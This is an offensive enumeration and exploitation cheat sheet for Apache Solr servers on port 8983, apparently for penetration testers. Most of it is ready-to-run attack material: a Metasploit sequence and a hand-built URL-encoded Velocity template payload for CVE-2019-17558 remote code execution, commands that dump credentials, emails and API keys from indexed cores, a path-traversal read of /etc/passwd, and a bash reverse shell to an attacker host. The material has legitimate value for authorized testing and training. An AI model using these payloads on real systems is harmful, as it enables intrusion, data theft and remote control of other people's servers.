# APACHE SOLR ENUMERATION (Port 8983)

## SERVICE OVERVIEW
```
Apache Solr - search platform built on Apache Lucene
- Default port: 8983
- Admin UI on /solr/
- Multiple critical RCE vulnerabilities
- Often contains indexed sensitive data
```

## DETECTION
```bash
nmap -sV -p8983 <IP>
curl http://<IP>:8983/solr/
curl http://<IP>:8983/solr/admin/info/system
```

## VERSION DETECTION
```bash
# Get Solr version
curl http://<IP>:8983/solr/admin/info/system?wt=json | grep solr-spec-version
curl http://<IP>:8983/solr/ | grep -i version
```

## CRITICAL VULNERABILITIES
```bash
# CVE-2019-17558: Velocity template RCE (Solr < 8.3.1)
# CVE-2019-12409: XXE vulnerability
# CVE-2017-12629: XXE and RCE
# CVE-2013-6407: XXE file disclosure

# Most common: CVE-2019-17558
# Metasploit
use exploit/multi/http/solr_velocity_template_rce
set RHOSTS <IP>
set RPORT 8983
set LHOST <attacker_IP>
check
exploit

# Manual exploitation (CVE-2019-17558)
curl "http://<IP>:8983/solr/<core>/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
```

## DATA EXTRACTION
```bash
# List cores
curl http://<IP>:8983/solr/admin/cores?action=STATUS

# Query all data from a core
curl "http://<IP>:8983/solr/<core>/select?q=*:*&rows=1000"

# Extract specific fields
curl "http://<IP>:8983/solr/<core>/select?q=*:*&fl=email,password,username"

# Solr often contains:
# - User credentials
# - Email addresses
# - Personal data
# - API keys
# - Session tokens
```

## CONFIG FILE DISCLOSURE
```bash
# Read Solr config (may contain credentials)
curl http://<IP>:8983/solr/<core>/admin/file?file=solrconfig.xml
curl http://<IP>:8983/solr/<core>/admin/file?file=schema.xml

# Read arbitrary files (if vulnerable)
curl http://<IP>:8983/solr/<core>/admin/file?file=../../../../etc/passwd
```

## QUICK WIN CHECKLIST
```
☐ Determine Solr version
☐ Test CVE-2019-17558 (Velocity RCE)
☐ Test CVE-2017-12629 (XXE/RCE)
☐ List all cores
☐ Extract all indexed data
☐ Look for credentials in indexed data
☐ Read config files
☐ Test for arbitrary file read (XXE)
```

## CRITICAL PRIORITY
```
Solr has CRITICAL RCE vulnerabilities!
CVE-2019-17558 = Unauthenticated RCE
Check version first, then exploit!

Also contains sensitive indexed data:
- Passwords
- Emails
- Personal information
- API keys
```

## POST-EXPLOITATION
```bash
# After RCE via CVE-2019-17558:
# 1. Establish reverse shell
# 2. Extract all indexed data
# 3. Read Solr config for DB credentials
# 4. Pivot to backend systems
# 5. Look for other Solr instances

# Reverse shell payload (URL-encoded in exploit)
bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1
```
